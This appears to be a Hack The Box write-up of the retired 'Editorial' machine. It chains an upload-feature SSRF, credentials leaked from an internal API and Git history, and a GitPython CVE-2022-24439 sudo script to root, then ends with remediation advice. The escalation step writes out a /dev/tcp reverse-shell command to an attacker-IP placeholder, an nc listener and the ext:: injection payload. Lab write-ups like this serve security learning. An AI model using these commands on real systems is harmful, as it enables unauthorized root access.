---
title: "Editorial — SSRF and Git History Credential Leak to GitPython Command Injection"
description: "SSRF in a book-cover upload exposes an internal API and development credentials; Git history reveals production credentials, and a sudo-permitted GitPython script vulnerable to CVE-2022-24439 yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - ssrf
  - gitpython
  - credential-leak
objective: "Chain an unauthenticated SSRF, leaked credentials, and a sudo-permitted GitPython script to root."
tools:
  - rustscan
  - ffuf
  - curl
  - sshpass
  - git
  - netcat
  - python3
skill: "SSRF exploitation and credential-driven lateral movement to GitPython command injection"
outcome: "Root command execution via GitPython CVE-2022-24439 through a sudo-permitted script"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu 22.04); nginx publishing platform |
| Starting position | Unauthenticated network access |
| Objective | Chain SSRF, credential leakage, and a vulnerable GitPython sudo script to root |
| Outcome | Root command execution via CVE-2022-24439 as the production user |

## SSRF to GitPython ext:: root

Editorial is an Easy-rated Hack The Box Linux lab. A book-cover upload feature on a publishing platform fetches user-supplied URLs server-side, and the resulting SSRF reaches an internal API that returns development-user credentials; SSH access with those credentials then exposes a Git repository whose history leaks production credentials, and a sudo rule lets the production user run a GitPython script as root that is vulnerable to CVE-2022-24439. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **SSRF via cover upload → internal API credential leak → SSH as development user → Git history production credential leak → SSH as production user → GitPython `ext::` command injection (CVE-2022-24439) → root**

## Ubuntu publishing platform, unauthenticated, SSRF to root

- **Target:** Linux (Ubuntu 22.04) hosting an nginx publishing platform.
- **Exposed services:** SSH (22) and HTTP (80).
- **Starting position:** unauthenticated network access.
- **Objective:** identify and exploit the SSRF vector, enumerate internal services, recover credentials, and escalate to root.
- **Constraints:** activity was confined to the Hack The Box lab environment. The platform is served under a hostname-based vhost, so `<TARGET_HOST>` is resolved to the target address for the web requests below.

## Evidence: SSRF to git history to GitPython injection

### 1. Service Enumeration

Observation: the target exposes SSH and HTTP.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -sC -sV -Pn -oN nmap/target-TCP
```

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Significance: only two services are exposed, and the HTTP vhost is the sole interaction point for the upload feature.

Result: SSH and nginx are identified, and the publishing platform is reachable over HTTP.

### 2. SSRF via Book Cover Upload

Observation: the cover-upload action accepts a user-supplied `bookurl` and fetches it server-side, so pointing it at loopback ports probes the internal interface through the SSRF.

```bash
ffuf -u http://<TARGET_HOST><UPLOAD_ENDPOINT> -request ssrf.req -w <(seq 0 65535) -ac
```

```text
5000  [Status: 200]
```

Significance: the server-side fetch reaches loopback, so the upload feature exposes services bound to the internal interface.

Result: an internal API service answers on port 5000.

### 3. Internal API Enumeration

Observation: the internal service exposes metadata endpoints, and its JSON response is retrievable through the SSRF via the upload feature's static output path.

```bash
curl http://<TARGET_HOST>/static/uploads/<UPLOAD_ID>.json -s | jq .
```

```json
{
  "messages": [
    { "promotions": { "endpoint": "<PROMOTIONS_ENDPOINT>", "methods": "GET" } },
    { "new_authors": { "endpoint": "<AUTHORS_ENDPOINT>", "methods": "GET" } }
  ],
  "version": [
    { "changelog": { "endpoint": "<CHANGELOG_ENDPOINT>", "methods": "GET" } }
  ]
}
```

Significance: the API advertises its own routes, so the credential-bearing authors endpoint is discoverable without further guessing.

Result: metadata endpoints are enumerated and the onboarding (authors) endpoint is identified.

### 4. Credential Leak via Internal API

Observation: the authors endpoint returns onboarding credentials.

```bash
curl -X POST http://<TARGET_HOST><UPLOAD_ENDPOINT> \
  -F "bookurl=http://<INTERNAL_API_HOST>:5000<AUTHORS_ENDPOINT>" \
  -F "bookfile=@/dev/null;filename="
```

```text
Your login credentials for our internal forum and authors site are:
Username: <DEVELOPMENT_USER>
Password: <DEVELOPMENT_USER_PASSWORD>
Please be sure to change your password as soon as possible for security purposes.
```

Significance: an internal-only endpoint returns plaintext credentials, so the SSRF alone yields usable account data.

Result: development-user credentials are recovered through the SSRF.

### 5. SSH Access as Development User

Observation: the recovered credentials fit the exposed SSH service.

```bash
sshpass -p '<DEVELOPMENT_USER_PASSWORD>' ssh <DEVELOPMENT_USER>@<TARGET_HOST>
```

The source records this login and the later production-user login as successful, but I could not verify either from captured session output.

Significance: authenticated access as the development user provides the home directory that holds the Git repository used in the next stage.

Result: a development-user shell is obtained.

### 6. Git History Credential Leak

Observation: I checked the Git history of the repository under the development user's home directory and found a reverted production configuration change.

```bash
cd <DEVELOPMENT_HOME>/<REPOSITORY_DIRECTORY> && git log
```

```text
commit <COMMIT_HASH>
    change(api): downgrading prod to dev
```

```bash
git show <COMMIT_HASH>
```

```text
-    const password = '<PRODUCTION_USER_PASSWORD>';
```

Significance: secrets removed from the working tree persist in history, so the reverted change still exposes the production password.

Result: production-user credentials are recovered from commit history.

### 7. Lateral Movement to Production User

Observation: the production credentials fit the same SSH service.

```bash
sshpass -p '<PRODUCTION_USER_PASSWORD>' ssh <PRODUCTION_USER>@<TARGET_HOST>
```

Significance: the production account holds the sudo rule that permits root execution and is the pivot for privilege escalation.

Result: a production-user shell is obtained.

### 8. Privilege Escalation via CVE-2022-24439

Observation: the production user may run a Python script as root.

```bash
sudo -l
```

```text
User <PRODUCTION_USER> may run the following commands on <TARGET_HOST>:
    (root) /usr/bin/python3 <PRIVILEGED_SCRIPT_PATH> *
```

The script clones a user-supplied URL with GitPython and enables the `ext::` transport:

```python
import os, sys
from git import Repo
os.chdir('<PRIVILEGED_WORKING_DIRECTORY>')
url_to_clone = sys.argv[1]
r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Action: GitPython before 3.1.30 is vulnerable to CVE-2022-24439: the `ext::` transport runs shell commands, and the wildcard sudo rule permits an arbitrary clone URL.

```bash
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTEN_PORT> 0>&1" > /tmp/revshell.sh
nc -nlvp <LISTEN_PORT>
```

```bash
sudo /usr/bin/python3 <PRIVILEGED_SCRIPT_PATH> 'ext::sh -c bash% /tmp/revshell.sh'
```

```text
root@<TARGET_HOST>:<PRIVILEGED_WORKING_DIRECTORY>#
```

Significance: the wildcard argument combined with the enabled `ext::` protocol turns a narrow-looking sudo rule into arbitrary root command execution.

Result: the callback returned a root shell, which confirms the privilege change.

## Challenges and Decisions

The source documents no failed attempts or tradeoffs; the exploitation path was linear from SSRF to root, and each stage supplied the next with a usable credential or execution context.

## Outcome: root command execution via sudo-permitted GitPython

The returned root shell prompt confirms root command execution on the target through a sudo-permitted GitPython script vulnerable to CVE-2022-24439.

## Recommendations: upload SSRF, API credentials, git history, wildcard sudo

1. **Server-side request forgery in the upload feature.** The cover-upload action fetched any user-supplied URL, exposing loopback-only services. *Recommendation:* validate and allowlist outbound fetch destinations, block loopback and internal ranges, and avoid returning fetched response bodies to the requester. *Detection:* flag requests whose `bookurl` targets internal addresses.
2. **Internal API returned plaintext credentials.** The authors endpoint disclosed onboarding credentials to any caller reaching it. *Recommendation:* never return reusable credentials from APIs, and require authentication even for internal-only endpoints.
3. **Secrets persisted in Git history.** The production password was removed from the working tree but survived in a reverted commit. *Recommendation:* purge secrets from history and treat any exposed value as compromised and rotate it; add secret scanning to the pipeline and store secrets in a manager rather than source.
4. **GitPython `ext::` transport reachable through a wildcard sudo rule.** Enabling `-c protocol.ext.allow=always` allowed command execution, and the `*` argument let the production user choose the clone URL. *Recommendation:* upgrade GitPython to 3.1.30 or later, restrict the sudo rule to fixed arguments rather than a wildcard, and avoid enabling the `ext::` protocol.

## References

- [Hack The Box — Editorial](https://app.hackthebox.com/machines/Editorial) (retired Linux machine)
- [NVD — CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) (GitPython remote code execution via the `ext::` protocol)
- [GitHub Advisory — GHSA-hcpj-qp55-gfph](https://github.com/advisories/GHSA-hcpj-qp55-gfph) (GitPython remote code execution via the `ext::` protocol; CVE-2022-24439)
- [GitPython 3.1.30 release](https://github.com/gitpython-developers/GitPython/releases/tag/3.1.30) (fix version for CVE-2022-24439)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [ffuf](https://github.com/ffuf/ffuf) (content and parameter fuzzing, including the internal port scan)
- [curl — command-line tool and library](https://curl.se/docs/manpage.html)
- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
- [Git — Reference](https://git-scm.com/docs) (commit history inspection)
